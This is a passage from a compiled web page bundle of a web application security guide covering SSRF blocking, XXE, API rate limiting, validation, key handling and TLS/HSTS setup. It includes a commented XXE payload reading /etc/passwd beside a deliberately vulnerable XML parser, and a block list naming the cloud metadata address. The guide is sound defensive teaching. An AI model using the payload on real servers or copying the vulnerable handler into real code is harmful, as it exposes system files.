Blacklist of dangerous hosts/IPs\nconst BLOCKED_HOSTS = [\n  'localhost',\n  '127.0.0.1',\n  '0.0.0.0',\n  '169.254.169.254', // AWS metadata\n  '169.254.169.253',\n  '[::1]', // IPv6 localhost\n  '[0:0:0:0:0:0:0:1]'\n];\n\nconst BLOCKED_IP_RANGES = [\n  /^10\\./, // Private network\n  /^172\\.(1[6-9]|2[0-9]|3[0-1])\\./, // Private network\n  /^192\\.168\\./, // Private network\n  /^127\\./, // Loopback\n  /^169\\.254\\./ // Link-local\n];\n\nfunction isUrlSafe(urlString) {\n  try {\n    const url = new URL(urlString);\n\n    // Only allow HTTP/HTTPS\n    if (!['http:', 'https:'].includes(url.protocol)) {\n      return false;\n    }\n\n    // Check whitelist\n    if (!ALLOWED_DOMAINS.some(domain => url.hostname.endsWith(domain))) {\n      return false;\n    }\n\n    // Check blacklist\n    if (BLOCKED_HOSTS.includes(url.hostname.toLowerCase())) {\n      return false;\n    }\n\n    // Check IP ranges\n    if (BLOCKED_IP_RANGES.some(pattern => pattern.test(url.hostname))) {\n      return false;\n    }\n\n    return true;\n  } catch (err) {\n    return false;\n  }\n}\n\n// \u2705 SAFE\napp.get('/fetch-url', async (req, res) => {\n  const url = req.query.url;\n\n  if (!isUrlSafe(url)) {\n    return res.status(400).json({ error: 'Invalid or forbidden URL' });\n  }\n\n  try {\n    const response = await axios.get(url, {\n      timeout: 5000,\n      maxRedirects: 0, // Disable redirects\n      validateStatus: status => status === 200\n    });\n\n    res.send(response.data);\n  } catch (err) {\n    res.status(500).json({ error: 'Failed to fetch URL' });\n  }\n});\n"})}),"\n",(0,r.jsx)(n.h3,{id:"xml-external-entity-xxe-1",children:"XML External Entity (XXE)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Vulnerable Example:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u274c VULNERABLE\nconst libxmljs = require('libxmljs');\n\napp.post('/parse-xml', (req, res) => {\n  const xml = req.body.xml;\n\n  // Attack XML:\n  // <?xml version=\"1.0\"?>\n  // <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n  // <data>&xxe;</data>\n\n  const doc = libxmljs.parseXml(xml);\n  res.send(doc.toString());\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u2705 SAFE - Disable external entities\nconst libxmljs = require('libxmljs');\n\napp.post('/parse-xml', (req, res) => {\n  const xml = req.body.xml;\n\n  try {\n    const doc = libxmljs.parseXml(xml, {\n      noent: false,        // Don't substitute entities\n      nonet: true,         // Don't fetch external resources\n      dtdload: false,      // Don't load external DTD\n      dtdvalid: false      // Don't validate against DTD\n    });\n\n    res.send(doc.toString());\n  } catch (err) {\n    res.status(400).json({ error: 'Invalid XML' });\n  }\n});\n\n// \u2705 BETTER - Use JSON instead of XML when possible\napp.post('/parse-data', express.json(), (req, res) => {\n  // JSON doesn't have XXE vulnerabilities\n  const data = req.body;\n  res.json(data);\n});\n"})}),"\n",(0,r.jsx)(n.h3,{id:"api-security-best-practices-1",children:"API Security Best Practices"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Rate Limiting:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const rateLimit = require('express-rate-limit');\nconst RedisStore = require('rate-limit-redis');\n\n// General API rate limit\nconst apiLimiter = rateLimit({\n  store: new RedisStore({\n    client: redisClient,\n    prefix: 'rl:api:'\n  }),\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // 100 requests per window\n  standardHeaders: true,\n  legacyHeaders: false,\n  message: { error: 'Too many requests, please try again later' }\n});\n\napp.use('/api/', apiLimiter);\n\n// Stricter limit for authentication endpoints\nconst authLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000,\n  max: 5,\n  skipSuccessfulRequests: true\n});\n\napp.post('/api/login', authLimiter, loginHandler);\n\n// Per-user rate limiting\nconst createUserLimiter = () => rateLimit({\n  windowMs: 60 * 1000, // 1 minute\n  max: 10,\n  keyGenerator: (req) => req.user?.id || req.ip,\n  skip: (req) => req.user?.role === 'admin'\n});\n\napp.post('/api/posts', authenticateToken, createUserLimiter(), createPost);\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"API Versioning:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// URL versioning\napp.use('/api/v1', v1Router);\napp.use('/api/v2', v2Router);\n\n// Header versioning\napp.use((req, res, next) => {\n  const version = req.headers['api-version'] || '1';\n  req.apiVersion = version;\n  next();\n});\n\n// Deprecation warnings\napp.use('/api/v1', (req, res, next) => {\n  res.set('Warning', '299 - \"API v1 is deprecated, please use v2\"');\n  res.set('Sunset', 'Sat, 31 Dec 2025 23:59:59 GMT');\n  next();\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Request Validation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const { body, param, query, validationResult } = require('express-validator');\n\nconst validateRequest = (req, res, next) => {\n  const errors = validationResult(req);\n  if (!errors.isEmpty()) {\n    return res.status(400).json({ errors: errors.array() });\n  }\n  next();\n};\n\napp.post('/api/users',\n  [\n    body('email').isEmail().normalizeEmail(),\n    body('password').isLength({ min: 12 }),\n    body('age').optional().isInt({ min: 13, max: 120 }),\n    validateRequest\n  ],\n  createUser\n);\n\napp.get('/api/users/:id',\n  [\n    param('id').isUUID(),\n    validateRequest\n  ],\n  getUser\n);\n\napp.get('/api/posts',\n  [\n    query('page').optional().isInt({ min: 1 }),\n    query('limit').optional().isInt({ min: 1, max: 100 }),\n    query('sort').optional().isIn(['asc', 'desc']),\n    validateRequest\n  ],\n  getPosts\n);\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"API Authentication:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// API Key authentication\nconst API_KEYS = new Map(); // In production, use database\n\nfunction authenticateAPIKey(req, res, next) {\n  const apiKey = req.headers['x-api-key'];\n\n  if (!apiKey) {\n    return res.status(401).json({ error: 'API key required' });\n  }\n\n  const keyData = API_KEYS.get(apiKey);\n\n  if (!keyData || keyData.expiresAt < Date.now()) {\n    return res.status(401).json({ error: 'Invalid or expired API key' });\n  }\n\n  req.apiKeyData = keyData;\n  next();\n}\n\n// Generate API keys\nfunction generateAPIKey() {\n  return crypto.randomBytes(32).toString('base64url');\n}\n\napp.post('/api/keys/generate', authenticateToken, async (req, res) => {\n  const apiKey = generateAPIKey();\n  const expiresAt = Date.now() + (365 * 24 * 60 * 60 * 1000); // 1 year\n\n  await db.query(\n    'INSERT INTO api_keys (key_hash, user_id, expires_at) VALUES (?, ?, ?)',\n    [hashAPIKey(apiKey), req.user.id, expiresAt]\n  );\n\n  // Return key only once\n  res.json({\n    apiKey: apiKey,\n    expiresAt: expiresAt,\n    warning: 'Store this key securely. It will not be shown again.'\n  });\n});\n\nfunction hashAPIKey(key) {\n  return crypto.createHash('sha256').update(key).digest('hex');\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Response Security:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Don't leak sensitive info in responses\napp.use((err, req, res, next) => {\n  console.error(err); // Log full error server-side\n\n  // Send generic error to client\n  res.status(err.status || 500).json({\n    error: process.env.NODE_ENV === 'production'\n      ? 'An error occurred'\n      : err.message\n  });\n});\n\n// Remove sensitive fields\nfunction sanitizeUser(user) {\n  const { password, passwordResetToken, mfaSecret, ...safe } = user;\n  return safe;\n}\n\napp.get('/api/users/:id', async (req, res) => {\n  const user = await getUserById(req.params.id);\n  res.json(sanitizeUser(user));\n});\n\n// Set proper content type\napp.use((req, res, next) => {\n  res.type('application/json');\n  next();\n});\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"7-transport--network-security-1",children:"7. Transport & Network Security"}),"\n",(0,r.jsx)(n.h3,{id:"https--tls-1",children:"HTTPS & TLS"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Why HTTPS:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Encryption"}),": Protects data in transit"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Authentication"}),": Verifies server identity"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Integrity"}),": Prevents tampering"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"TLS Configuration (Node.js):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const https = require('https');\nconst fs = require('fs');\n\nconst options = {\n  key: fs.readFileSync('/path/to/private-key.pem'),\n  cert: fs.readFileSync('/path/to/certificate.pem'),\n  ca: fs.readFileSync('/path/to/ca-certificate.pem'),\n\n  // Security settings\n  minVersion: 'TLSv1.2',\n  maxVersion: 'TLSv1.3',\n  ciphers: [\n    'ECDHE-ECDSA-AES128-GCM-SHA256',\n    'ECDHE-RSA-AES128-GCM-SHA256',\n    'ECDHE-ECDSA-AES256-GCM-SHA384',\n    'ECDHE-RSA-AES256-GCM-SHA384',\n    'ECDHE-ECDSA-CHACHA20-POLY1305',\n    'ECDHE-RSA-CHACHA20-POLY1305'\n  ].join(':'),\n  honorCipherOrder: true,\n\n  // Disable insecure renegotiation\n  secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION\n};\n\nhttps.createServer(options, app).listen(443);\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Nginx TLS Configuration:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-nginx",children:"server {\n    listen 443 ssl http2;\n    server_name example.com;\n\n    # Certificates\n    ssl_certificate /path/to/fullchain.pem;\n    ssl_certificate_key /path/to/privkey.pem;\n\n    # TLS versions\n    ssl_protocols TLSv1.2 TLSv1.3;\n\n    # Ciphers\n    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305';\n    ssl_prefer_server_ciphers off;\n\n    # Performance\n    ssl_session_cache shared:SSL:10m;\n    ssl_session_timeout 10m;\n    ssl_session_tickets off;\n\n    # OCSP Stapling\n    ssl_stapling on;\n    ssl_stapling_verify on;\n    ssl_trusted_certificate /path/to/chain.pem;\n\n    # Security headers\n    add_header Strict-Transport-Security \"max-age=63072000; includeSubDomains; preload\" always;\n\n    location / {\n        proxy_pass http://localhost:3000;\n    }\n}\n\n# Redirect HTTP to HTTPS\nserver {\n    listen 80;\n    server_name example.com;\n    return 301 https://$server_name$request_uri;\n}\n"})}),"\n",(0,r.jsx)(n.h3,{id:"certificate-management-1",children:"Certificate Management"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Let's Encrypt with Certbot:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# Install certbot\nsudo apt-get install certbot python3-certbot-nginx\n\n# Obtain certificate\nsudo certbot --nginx -d example.com -d www.example.com\n\n# Auto-renewal (runs twice daily)\nsudo certbot renew --dry-run\n\n# Renewal hook\nsudo certbot renew --deploy-hook "systemctl reload nginx"\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Automated Renewal (Cron):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# /etc/cron.d/certbot\n0 */12 * * * root certbot renew --quiet --deploy-hook "systemctl reload nginx"\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Certificate Monitoring:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const https = require('https');\nconst tls = require('tls');\n\nasync function checkCertificateExpiry(hostname) {\n  return new Promise((resolve, reject) => {\n    const socket = tls.connect(443, hostname, () => {\n      const cert = socket.getPeerCertificate();\n\n      if (!socket.authorized) {\n        reject(new Error('Certificate not authorized'));\n      }\n\n      const daysUntilExpiry = Math.floor(\n        (new Date(cert.valid_to) - new Date()) / (1000 * 60 * 60 * 24)\n      );\n\n      socket.end();\n      resolve({\n        hostname,\n        issuer: cert.issuer.O,\n        validFrom: cert.valid_from,\n        validTo: cert.valid_to,\n        daysUntilExpiry\n      });\n    });\n\n    socket.on('error', reject);\n  });\n}\n\n// Alert if certificate expires soon\nconst domains = ['example.com', 'api.example.com'];\n\nsetInterval(async () => {\n  for (const domain of domains) {\n    const cert = await checkCertificateExpiry(domain);\n\n    if (cert.daysUntilExpiry < 30) {\n      console.warn(`Certificate for ${domain} expires in ${cert.daysUntilExpiry} days!`);\n      // Send alert\n    }\n  }\n}, 24 * 60 * 60 * 1000); // Check daily\n"})}),"\n",(0,r.jsx)(n.h3,{id:"http-strict-transport-security-hsts-1",children:"HTTP Strict Transport Security (HSTS)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Header Configuration:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Express\napp.use((req, res, next) => {\n  res.setHeader(\n    'Strict-Transport-Security',\n    'max-age=63072000; includeSubDomains; preload'\n  );\n  next();\n});\n\n// Or use Helmet\nconst helmet = require('helmet');\n\napp.use(helmet.hsts({\n  maxAge: 63072000, // 2 years\n  includeSubDomains: true,\n  preload: true\n}));\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"HSTS Preload:"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"Set header with `"}),"\n"]})]})}function u(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}}}]);